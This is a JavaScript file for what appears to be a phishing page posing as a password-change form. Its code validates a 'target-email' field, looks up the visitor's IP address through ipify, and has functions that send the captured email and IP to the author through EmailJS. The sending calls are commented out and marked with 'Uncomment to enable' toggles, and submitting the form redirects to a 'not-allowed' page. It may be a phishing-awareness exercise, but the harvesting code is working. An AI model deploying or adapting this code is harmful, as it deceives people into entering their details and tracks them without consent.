let ip = null;
// ! Switch to live URL
let rootUrl = "https://gpaphitis.github.io/ChangePassword/cd2feffee199eea9354472021b566af07530d53d";
// let rootUrl = "http://localhost:5500/cd2feffee199eea9354472021b566af07530d53d";
document.addEventListener("DOMContentLoaded", () =>
{
   document.querySelector("#next").addEventListener("click", submit);
   document.querySelector("#cancel").addEventListener("click", clearForm);
   document.querySelector("#target-email").addEventListener("input", checkValid);
   // ! Uncomment to enable email send upon loading of page
   console.log("Sent");
   // sendIp();
});
function clearForm()
{
   // Clears all empty field errors
   let inputs = document.querySelectorAll("input");
   let emptyErrors = document.querySelectorAll(".empty-error");
   for (let i = 0; i < emptyErrors.length; i++) {
      inputs[i].value = "";
      makeInvisible(emptyErrors[i]);
   }
   // Clears specific invalid email error
   makeInvisible(document.querySelector("#email-error"))
}
async function getIp()
{
   let response = await fetch('https://api.ipify.org?format=json');
   let data = await response.json();
   ip = data['ip'];
}
function checkValid()
{
   if (document.querySelector("#target-email:invalid") != null) {
      makeVisible(document.querySelector("#email-error"));
   }
   else {
      makeInvisible(document.querySelector("#email-error"));
   }
}
function submit(e)
{
   e.preventDefault();
   // If element is valid then this will be null
   let invalid = document.querySelector("#target-email:invalid");
   let isFormCorrect = true;
   if (!isFormValid())
      isFormCorrect = false;
   if (invalid != null)
      isFormCorrect = false;
   if (isFormCorrect === true) {
      let email = document.querySelector("#target-email").value;
      // ! Uncomment to enable email send upon submitting
      // submitEmail(email, "TJSS Submitted").then(() =>
      // {
      window.location.replace(`${rootUrl}/not-allowed.html`);
      // });
   }
}
function isFormValid()
{
   let inputs = document.querySelectorAll("input");
   let emptyErrors = document.querySelectorAll(".empty-error");
   let isValid = true;
   for (let i = 0; i < inputs.length; i++) {
      if (inputs[i].value === "") {
         makeVisible(emptyErrors[i]);
         isValid = false;
      }
      else
         makeInvisible(emptyErrors[i]);
   }
   return isValid;
}
function makeVisible(element)
{
   element.classList.remove("hidden");
}
function makeInvisible(element)
{
   element.classList.add("hidden");
}
async function submitEmail(email, subject)
{
   let properties = await getProperties();
   let url = "https://api.emailjs.com/api/v1.0/email/send";
   const API_KEY = properties["api-key"];
   const TEMPLATE_ID = properties["template-id"];
   const SERVICE_ID = properties["service-id"];
   let request = new Request(url, {
      method: "POST",
      headers: {
         "Content-Type": "application/json"
      },
      body: JSON.stringify({
         service_id: SERVICE_ID,
         template_id: TEMPLATE_ID,
         user_id: API_KEY,
         template_params: {
            subject: subject,
            caught_email: email,
            ip_address: ip
         }
      })
   });
   let response = await fetch(request);
   console.log("Sent");
}
async function sendIp()
{
   await getIp();
   submitEmail(null, "TJSS Clicked");
}
async function getProperties()
{
   let response = await fetch(`${rootUrl}/resources/api-properties.json`);
   let data = await response.json();
   return data;
}